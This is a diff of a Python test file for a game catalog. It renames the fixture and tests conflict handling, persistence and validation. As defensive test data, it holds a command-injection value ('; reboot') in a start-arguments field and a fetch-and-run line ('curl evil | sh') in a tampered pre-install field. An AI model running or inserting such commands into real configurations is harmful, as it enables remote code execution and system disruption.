@@ -194,38 +194,38 @@ def test_so_o_minimo_basta(dados_de_jogo):
 
 # --- Catalogo (curado + dinamico) -------------------------------------------
 
-def test_catalogo_lista_curados_menos_o_template(catalogo):
-    assert [j.key for j in catalogo.list_all()] == ["alfa", "beta", "conta", "delta"]
+def test_catalogo_lista_curados_menos_o_template(catalog):
+    assert [j.key for j in catalog.list_all()] == ["alfa", "beta", "conta", "delta"]
 
 
-def test_adicionar_persiste_e_sobrevive_a_recarga(catalogo, dados_de_jogo, tmp_path):
-    catalogo.add_dynamic(dados_de_jogo)
+def test_adicionar_persiste_e_sobrevive_a_recarga(catalog, dados_de_jogo, tmp_path):
+    catalog.add_dynamic(dados_de_jogo)
     outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
     assert outro.get("meujogo").name == "Meu Jogo"
     assert outro.errors == []
 
 
-def test_adicionar_chave_de_jogo_curado_e_conflito(catalogo, dados_de_jogo):
+def test_adicionar_chave_de_jogo_curado_e_conflito(catalog, dados_de_jogo):
     dados_de_jogo["chave"] = "alfa"
     with pytest.raises(Conflito):
-        catalogo.add_dynamic(dados_de_jogo)
+        catalog.add_dynamic(dados_de_jogo)
 
 
-def test_adicionar_duas_vezes_e_conflito(catalogo, dados_de_jogo):
-    catalogo.add_dynamic(dados_de_jogo)
+def test_adicionar_duas_vezes_e_conflito(catalog, dados_de_jogo):
+    catalog.add_dynamic(dados_de_jogo)
     with pytest.raises(Conflito):
-        catalogo.add_dynamic(dados_de_jogo)
+        catalog.add_dynamic(dados_de_jogo)
 
 
-def test_jogo_recusado_nao_deixa_arquivo(catalogo, dados_de_jogo, tmp_path):
+def test_jogo_recusado_nao_deixa_arquivo(catalog, dados_de_jogo, tmp_path):
     dados_de_jogo["start_args"] = "; reboot"
     with pytest.raises(ErroDeValidacao):
-        catalogo.add_dynamic(dados_de_jogo)
+        catalog.add_dynamic(dados_de_jogo)
     assert list((tmp_path / "dinamico").glob("*")) == []
 
 
-def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalogo, dados_de_jogo, tmp_path):
-    catalogo.add_dynamic(dados_de_jogo)
+def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalog, dados_de_jogo, tmp_path):
+    catalog.add_dynamic(dados_de_jogo)
     arquivo = tmp_path / "dinamico" / "meujogo.json"
     adulterado = json.loads(arquivo.read_text())
     adulterado["pre_install_cmd"] = "curl evil | sh"
@@ -236,14 +236,14 @@ def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalogo, dados_de_jogo, tmp_
     assert any("meujogo.json" in e for e in outro.errors)
 
 
-def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalogo, dados_de_jogo, tmp_path):
-    catalogo.add_dynamic(dados_de_jogo)
+def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalog, dados_de_jogo, tmp_path):
+    catalog.add_dynamic(dados_de_jogo)
     (tmp_path / "dinamico" / "meujogo.json").rename(tmp_path / "dinamico" / "outro.json")
     outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
     with pytest.raises(NaoEncontrado):
         outro.get("meujogo")
 
 
-def test_jogo_desconhecido(catalogo):
+def test_jogo_desconhecido(catalog):
     with pytest.raises(NaoEncontrado):
-        catalogo.get("nao-existe")
+        catalog.get("nao-existe")
